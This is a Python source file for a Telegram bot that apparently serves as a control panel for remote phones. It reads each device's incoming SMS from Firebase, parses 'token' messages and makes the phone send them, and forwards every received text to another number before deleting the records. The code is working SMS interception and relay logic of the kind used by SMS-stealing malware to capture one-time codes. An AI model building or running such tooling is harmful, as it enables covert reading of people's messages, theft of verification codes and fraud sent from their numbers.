import threading
import time
import re
import telebot
from config import BOT_TOKEN, USER_DATA
from firebase_manager import read_incoming_sms, clear_sms_entry

bot = telebot.TeleBot(BOT_TOKEN)
ACTIVE_THREADS = {}

def parse_token(text: str):
    to_match = re.search(r'(?:To[:\s\(tap to copy\)]*)\s*\n?\s*(\+?[\d\s\-]{7,15})', text, re.IGNORECASE)
    body_match = re.search(r'(?:Body|Message)[:\s\(tap to copy\)]*\n?\s*(.+?)(?:\n|$)', text, re.IGNORECASE)
    if to_match and body_match:
        to_num = re.sub(r'\s', '', to_match.group(1))
        body = body_match.group(1).strip()
        return {"to": to_num, "body": body}

    pipe_match = re.search(r'(\+?[\d]{10,15})\s*\|\s*(.+)', text)
    if pipe_match:
        return {"to": pipe_match.group(1).strip(), "body": pipe_match.group(2).strip()}

    to2 = re.search(r'📞\s*To:\s*(\+?[\d\s]{7,15})', text)
    body2 = re.search(r'💬\s*Message:\s*(.+)', text)
    if to2 and body2:
        return {
            "to": re.sub(r'\s', '', to2.group(1)),
            "body": body2.group(1).strip()
        }

    return None

def send_token_via_device(firebase_url: str, device_id: str, sim: str, to: str, body: str) -> bool:
    import requests, json, time
    payload = {
        "to": to,
        "body": body,
        "sim": sim,
        "timestamp": int(time.time())
    }
    try:
        path = f"{firebase_url.rstrip('/')}/devices/{device_id}/outgoing/{sim}.json"
        r = requests.put(path, data=json.dumps(payload), timeout=3)
        return r.status_code == 200
    except Exception:
        return False

def forward_sms_to_number(bot_instance, user_id: int, from_num: str, body: str, forward_to: str):
    msg = (
        f"📨 <b>Incoming SMS Forwarded</b>\n"
        f"From: <code>{from_num}</code>\n"
        f"Body: <code>{body}</code>\n"
        f"Forwarded To: <code>{forward_to}</code>"
    )
    bot_instance.send_message(user_id, msg, parse_mode="HTML")

def session_loop(user_id: int, stop_event: threading.Event):
    from config import USER_DATA
    while not stop_event.is_set():
        data = USER_DATA.get(user_id, {})
        if not data.get("session_active"):
            break
        device = data.get("connected_device")
        channel = data.get("channel")
        forward_number = data.get("forward_number")

        if not device or not channel:
            time.sleep(2)
            continue

        firebase_url = device["firebase_url"]
        device_id = device["device_id"]
        sim = device["sim"]
        sms_list = read_incoming_sms(firebase_url, device_id, sim)

        for sms in sms_list:
            key = sms["key"]
            from_num = sms["from"]
            body = sms["body"]
            token_data = parse_token(body)

            if token_data:
                to_num = token_data["to"]
                token_body = token_data["body"]
                results = []
                for _ in range(2):
                    ok = send_token_via_device(firebase_url, device_id, sim, to_num, token_body)
                    results.append("✅" if ok else "❌")
                log_msg = (
                    f"📤 <b>Token Forward Log</b>\n"
                    f"━━━━━━━━━━━\n"
                    f"To: <code>{to_num}</code>\n"
                    f"Body: <code>{token_body[:80]}</code>\n"
                    f"Send 1: {results[0]} | Send 2: {results[1]}\n"
                    f"SIM: {sim}"
                )
                try:
                    bot.send_message(user_id, log_msg, parse_mode="HTML")
                except Exception:
                    pass

            if forward_number:
                for _ in range(2):
                    send_token_via_device(firebase_url, device_id, sim, forward_number, body)
                forward_sms_to_number(bot, user_id, from_num, body, forward_number)

            clear_sms_entry(firebase_url, device_id, sim, key)

        time.sleep(1)

def start_session(user_id: int):
    if user_id in ACTIVE_THREADS:
        ACTIVE_THREADS[user_id].set()
    stop_event = threading.Event()
    ACTIVE_THREADS[user_id] = stop_event
    t = threading.Thread(target=session_loop, args=(user_id, stop_event), daemon=True)
    t.start()

def stop_session(user_id: int):
    if user_id in ACTIVE_THREADS:
        ACTIVE_THREADS[user_id].set()
        del ACTIVE_THREADS[user_id]
